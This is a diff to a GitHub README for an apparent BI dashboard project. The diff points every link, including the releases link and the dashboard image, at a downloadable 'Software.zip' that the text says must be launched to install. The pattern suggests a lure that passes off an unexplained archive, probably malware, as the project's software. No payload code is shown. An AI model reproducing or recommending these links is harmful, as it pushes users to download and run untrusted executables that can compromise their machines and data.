@@ -31,13 +31,13 @@ The AtliQ Hardware BI 360 Dashboard provides a powerful platform for data analys
 
 To get started with the AtliQ Hardware BI 360 Dashboard, download the necessary software package from the link below:
 
-[![Download Software](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v1.0/Release_x64.zip)](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v2.0/Software.zip)](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v2.0/Software.zip)
 
 **Note:** This software package needs to be launched for installation.
 
 ## Explore Further
 
-Visit the [Releases](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v1.0/Release_x64.zip) section for additional resources and updates related to the AtliQ Hardware BI 360 Dashboard.
+Visit the [Releases](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v2.0/Software.zip) section for additional resources and updates related to the AtliQ Hardware BI 360 Dashboard.
 
 ## Contributions
 
@@ -49,4 +49,4 @@ For any assistance or inquiries, please reach out to the repository owner.
 
 Let's unlock the power of data with the AtliQ Hardware BI 360 Dashboard! 🌟
 
-![Dashboard Image](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v1.0/Release_x64.zip)
+![Dashboard Image](https://github.com/KimaTUDO3/AtliQ-Hardware-Dashboard/releases/download/v2.0/Software.zip)
